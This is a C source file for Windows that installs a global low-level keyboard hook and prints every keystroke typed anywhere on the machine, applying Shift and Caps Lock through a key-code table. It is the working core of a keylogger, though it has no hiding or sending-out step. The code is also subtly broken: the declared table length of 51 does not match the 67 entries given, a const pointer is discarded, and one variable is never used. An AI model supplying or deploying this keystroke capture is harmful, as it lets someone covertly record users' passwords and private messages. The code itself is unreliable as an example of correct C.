#include <windows.h>
#include <stdio.h>
#include <stdbool.h>

static HHOOK g_hook;
static DWORD g_mainTid;

// windows key codes
#define winlen 51

typedef struct {
    int  code;      // Windows virtual key code
    char normal;    // character when unshifted
    char shifted;   // character when shifted
    bool use_caps;  // true if CAPS lock acts like shift for this key
} winkey_t;

const winkey_t winkeys[winlen] = {
    {   8, '\b', '\b', false },  // VK_BACK
    {   9, '\t', '\t', false },  // VK_TAB
    {  13, '\n', '\n', false },  // VK_RETURN
    {  32, ' ',  ' ',  false },  // VK_SPACE
    {  48, '0',  ')',  false },  // 0 key
    {  49, '1',  '!',  false },  // 1 key
    {  50, '2',  '@',  false },  // 2 key
    {  51, '3',  '#',  false },  // 3 key
    {  52, '4',  '$',  false },  // 4 key
    {  53, '5',  '%',  false },  // 5 key
    {  54, '6',  '^',  false },  // 6 key
    {  55, '7',  '&',  false },  // 7 key
    {  56, '8',  '*',  false },  // 8 key
    {  57, '9',  '(',  false },  // 9 key
    {  65, 'a',  'A',  true  },  // A key
    {  66, 'b',  'B',  true  },  // B key
    {  67, 'c',  'C',  true  },  // C key
    {  68, 'd',  'D',  true  },  // D key
    {  69, 'e',  'E',  true  },  // E key
    {  70, 'f',  'F',  true  },  // F key
    {  71, 'g',  'G',  true  },  // G key
    {  72, 'h',  'H',  true  },  // H key
    {  73, 'i',  'I',  true  },  // I key
    {  74, 'j',  'J',  true  },  // J key
    {  75, 'k',  'K',  true  },  // K key
    {  76, 'l',  'L',  true  },  // L key
    {  77, 'm',  'M',  true  },  // M key
    {  78, 'n',  'N',  true  },  // N key
    {  79, 'o',  'O',  true  },  // O key
    {  80, 'p',  'P',  true  },  // P key
    {  81, 'q',  'Q',  true  },  // Q key
    {  82, 'r',  'R',  true  },  // R key
    {  83, 's',  'S',  true  },  // S key
    {  84, 't',  'T',  true  },  // T key
    {  85, 'u',  'U',  true  },  // U key
    {  86, 'v',  'V',  true  },  // V key
    {  87, 'w',  'W',  true  },  // W key
    {  88, 'x',  'X',  true  },  // X key
    {  89, 'y',  'Y',  true  },  // Y key
    {  90, 'z',  'Z',  true  },  // Z key
    { 186, ';',  ':',  false },  // VK_OEM_1
    { 187, '=',  '+',  false },  // VK_OEM_PLUS
    { 188, ',',  '<',  false },  // VK_OEM_COMMA
    { 189, '-',  '_',  false },  // VK_OEM_MINUS
    { 190, '.',  '>',  false },  // VK_OEM_PERIOD
    { 191, '/',  '?',  false },  // VK_OEM_2
    { 192, '`',  '~',  false },  // VK_OEM_3
    { 219, '[',  '{',  false },  // VK_OEM_4
    { 220, '\\', '|',  false },  // VK_OEM_5
    { 221, ']',  '}',  false },  // VK_OEM_6
    { 222, '\'', '"',  false },  // VK_OEM_7
    {  96, '0',  '0',  false },  // VK_NUMPAD0
    {  97, '1',  '1',  false },  // VK_NUMPAD1
    {  98, '2',  '2',  false },  // VK_NUMPAD2
    {  99, '3',  '3',  false },  // VK_NUMPAD3
    { 100, '4',  '4',  false },  // VK_NUMPAD4
    { 101, '5',  '5',  false },  // VK_NUMPAD5
    { 102, '6',  '6',  false },  // VK_NUMPAD6
    { 103, '7',  '7',  false },  // VK_NUMPAD7
    { 104, '8',  '8',  false },  // VK_NUMPAD8
    { 105, '9',  '9',  false },  // VK_NUMPAD9
    { 106, '*',  '*',  false },  // VK_MULTIPLY
    { 107, '+',  '+',  false },  // VK_ADD
    { 109, '-',  '-',  false },  // VK_SUBTRACT
    { 110, '.',  '.',  false },  // VK_DECIMAL
    { 111, '/',  '/',  false },  // VK_DIVIDE
    { 226, '\\', '|',  false },  // VK_OEM_102
};

char winkey_char(const winkey_t *k, bool shift, bool caps) {
    if (shift ^ (caps && k->use_caps)) {
        return k->shifted;
    }
    return k->normal;
}

const winkey_t *winkey_find(int code) {
    for (int i = 0; i < winlen; i++)
        if (winkeys[i].code == code)
            return &winkeys[i];
    return NULL;  // not a mapped key
}

#define WM_KEYEVENT (WM_APP + 1)

LRESULT CALLBACK KbProc(int code, WPARAM wParam, LPARAM lParam) {
    if (code == HC_ACTION) {
        KBDLLHOOKSTRUCT *k = (KBDLLHOOKSTRUCT *)lParam;
        bool down = (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN);
        PostThreadMessage(g_mainTid, WM_KEYEVENT, k->vkCode, down);
    }
    return CallNextHookEx(g_hook, code, wParam, lParam);
}

int main(void) {
    g_mainTid = GetCurrentThreadId();
    g_hook = SetWindowsHookExA(WH_KEYBOARD_LL, KbProc, GetModuleHandle(NULL), 0);
    if (!g_hook) { printf("hook failed: %lu\n", GetLastError()); return 1; }

    MSG msg;
    bool shift = false;
    bool caps_lock = false;

    while (GetMessage(&msg, NULL, 0, 0)) {
        if (msg.hwnd == NULL && msg.message == WM_KEYEVENT) {
            // Set shift
            if (msg.wParam == VK_LSHIFT || msg.wParam == VK_RSHIFT) {
                shift = msg.lParam;
            }
            // Set caps lock (trigger only on press)
            else if (msg.wParam == VK_CAPITAL) {
                if (msg.lParam == 1) caps_lock = !caps_lock;
            } 
            // Handle all other keycodes
            else {
                bool use_alt = shift ^ caps_lock;
                winkey_t *key = winkey_find(msg.wParam);
                if (key && msg.lParam == 1) {
                    printf("%c", winkey_char(key, shift, caps_lock));
                }
            }
        }
    }
    UnhookWindowsHookEx(g_hook);
    return 0;
}